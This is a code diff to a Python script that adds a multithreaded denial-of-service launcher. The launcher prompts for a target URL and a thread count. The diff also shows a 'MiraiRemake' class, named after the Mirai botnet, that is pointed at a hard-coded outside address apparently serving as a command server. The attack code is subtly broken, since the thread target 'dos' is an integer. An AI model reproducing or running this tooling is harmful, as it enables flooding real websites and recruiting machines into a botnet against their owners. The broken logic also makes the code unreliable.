@@ -1,5 +1,28 @@
 import requests, uuid, time, json, threading, socket
 
+threads = 20
+dos = 20
+url = input("URL: ")
+
+try:
+    threads = int(input("Threads: "))
+except ValueError:
+    exit("Threads count is incorrect!")
+
+if threads == 0:
+    exit("Threads count is incorrect!")
+
+if not url.__contains__("http"):
+    exit("URL doesnt contains http or https!")
+
+if not url.__contains__("."):
+    exit("Invalid domain")
+
+for i in range(0, threads):
+    thr = threading.Thread(target=dos, args=(url,))
+    thr.start()
+    print(str(i + 1) + " thread started!")
+
 class MiraiRemake:
 
 	def __init__(self, host):
@@ -97,7 +120,37 @@ class MiraiRemake:
 				socket_c.close()
 			except: print("Error")
 
+
 MiraiRemake("http://185.104.249.82:5000")
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
